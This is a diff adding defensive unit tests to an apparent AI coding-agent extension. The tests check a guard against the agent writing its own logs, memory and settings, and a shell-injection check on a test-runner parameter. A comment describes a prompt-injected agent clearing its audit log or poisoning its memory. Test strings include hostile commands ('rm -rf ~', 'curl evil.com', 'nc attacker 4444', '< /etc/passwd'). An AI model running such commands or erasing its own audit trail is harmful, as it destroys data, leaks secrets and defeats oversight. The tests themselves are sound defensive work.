@@ -35,6 +35,22 @@ function isSensitiveFile(filePath: string): boolean {
   return SENSITIVE_PATTERNS.some((p) => p.test(basename));
 }
 
+// Test isProtectedWritePath logic (mirrors tools.ts implementation)
+const PROTECTED_WRITE_PREFIXES = ['.sidecar/logs/', '.sidecar/memory/', '.sidecar/sessions/', '.sidecar/cache/'];
+
+function isProtectedWritePath(filePath: string): string | null {
+  const normalized = filePath.replace(/\\/g, '/');
+  if (normalized === '.sidecar/settings.json') {
+    return `Refusing to write SideCar's own settings file (${filePath})`;
+  }
+  for (const prefix of PROTECTED_WRITE_PREFIXES) {
+    if (normalized.startsWith(prefix) || normalized.startsWith('./' + prefix)) {
+      return `Refusing to write under ${prefix}`;
+    }
+  }
+  return null;
+}
+
 describe('validateFilePath', () => {
   it('accepts valid relative paths', () => {
     expect(validateFilePath('src/index.ts')).toBeNull();
@@ -109,5 +125,100 @@ describe('isSensitiveFile', () => {
   it('checks basename not full path', () => {
     expect(isSensitiveFile('config/.env')).toBe(true);
     expect(isSensitiveFile('deeply/nested/.env.local')).toBe(true);
+  });
+});
+
+describe('isProtectedWritePath', () => {
+  // Regression: a prompt-injected agent used to be able to clear
+  // .sidecar/logs/audit.jsonl (repudiation) or poison
+  // .sidecar/memory/agent-memories.json (persistence across sessions).
+  // SENSITIVE_PATTERNS only looked at basenames so these slipped through.
+  it('blocks writes under .sidecar/logs (repudiation)', () => {
+    expect(isProtectedWritePath('.sidecar/logs/audit.jsonl')).not.toBeNull();
+    expect(isProtectedWritePath('.sidecar/logs/nested/file.log')).not.toBeNull();
+  });
+  it('blocks writes under .sidecar/memory (poisoning)', () => {
+    expect(isProtectedWritePath('.sidecar/memory/agent-memories.json')).not.toBeNull();
+  });
+  it('blocks writes under .sidecar/sessions and .sidecar/cache', () => {
+    expect(isProtectedWritePath('.sidecar/sessions/last.json')).not.toBeNull();
+    expect(isProtectedWritePath('.sidecar/cache/embeddings.bin')).not.toBeNull();
+  });
+  it('blocks writes to .sidecar/settings.json specifically', () => {
+    expect(isProtectedWritePath('.sidecar/settings.json')).not.toBeNull();
+  });
+  it('allows writes to human-editable .sidecar working areas', () => {
+    expect(isProtectedWritePath('.sidecar/SIDECAR.md')).toBeNull();
+    expect(isProtectedWritePath('.sidecar/plans/my-plan.md')).toBeNull();
+    expect(isProtectedWritePath('.sidecar/specs/my-spec.md')).toBeNull();
+    expect(isProtectedWritePath('.sidecar/scratchpad/notes.md')).toBeNull();
+  });
+  it('allows normal workspace writes', () => {
+    expect(isProtectedWritePath('src/foo.ts')).toBeNull();
+    expect(isProtectedWritePath('README.md')).toBeNull();
+  });
+  it('handles Windows-style separators', () => {
+    expect(isProtectedWritePath('.sidecar\\logs\\audit.jsonl')).not.toBeNull();
+  });
+  it('handles ./-prefixed paths', () => {
+    expect(isProtectedWritePath('./.sidecar/logs/audit.jsonl')).not.toBeNull();
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Shell quoting for run_tests `file` parameter
+// ---------------------------------------------------------------------------
+// Mirrors the implementation in tools.ts; tested here to lock in the
+// regression from the cycle-2 audit where `run_tests` interpolated a
+// model-supplied `file` string straight into a shell command.
+
+function shellQuote(value: string): string {
+  return `'${value.replace(/'/g, "'\\''")}'`;
+}
+
+function hasShellMetachar(value: string): boolean {
+  return /[\n\r;&|`$<>()!*?[\]{}"'\\]/.test(value);
+}
+
+describe('shellQuote', () => {
+  it('wraps simple values in single quotes', () => {
+    expect(shellQuote('foo.test.ts')).toBe("'foo.test.ts'");
+  });
+  it('escapes embedded single quotes so the quoting stays balanced', () => {
+    expect(shellQuote("foo's test.ts")).toBe("'foo'\\''s test.ts'");
+  });
+  it('safely handles spaces inside the path', () => {
+    expect(shellQuote('some file.ts')).toBe("'some file.ts'");
+  });
+});
+
+describe('hasShellMetachar (run_tests injection guard)', () => {
+  it('accepts plain relative paths', () => {
+    expect(hasShellMetachar('src/foo.test.ts')).toBe(false);
+    expect(hasShellMetachar('tests/unit/module.spec.ts')).toBe(false);
+    expect(hasShellMetachar('a-b_c.test.js')).toBe(false);
+  });
+  it('rejects command-chaining metacharacters', () => {
+    expect(hasShellMetachar('foo.test.ts; rm -rf ~')).toBe(true);
+    expect(hasShellMetachar('foo.test.ts && curl evil.com')).toBe(true);
+    expect(hasShellMetachar('foo.test.ts | nc attacker 4444')).toBe(true);
+  });
+  it('rejects substitution metacharacters', () => {
+    expect(hasShellMetachar('foo$(whoami).ts')).toBe(true);
+    expect(hasShellMetachar('foo`id`.ts')).toBe(true);
+  });
+  it('rejects redirection metacharacters', () => {
+    expect(hasShellMetachar('foo > /tmp/pwn')).toBe(true);
+    expect(hasShellMetachar('foo < /etc/passwd')).toBe(true);
+  });
+  it('rejects glob / quote / escape metacharacters', () => {
+    expect(hasShellMetachar('*.ts')).toBe(true);
+    expect(hasShellMetachar('foo?.ts')).toBe(true);
+    expect(hasShellMetachar("foo's")).toBe(true);
+    expect(hasShellMetachar('foo"bar')).toBe(true);
+    expect(hasShellMetachar('foo\\bar')).toBe(true);
+  });
+  it('rejects newline-based injection', () => {
+    expect(hasShellMetachar('foo\nrm -rf ~')).toBe(true);
   });
 });
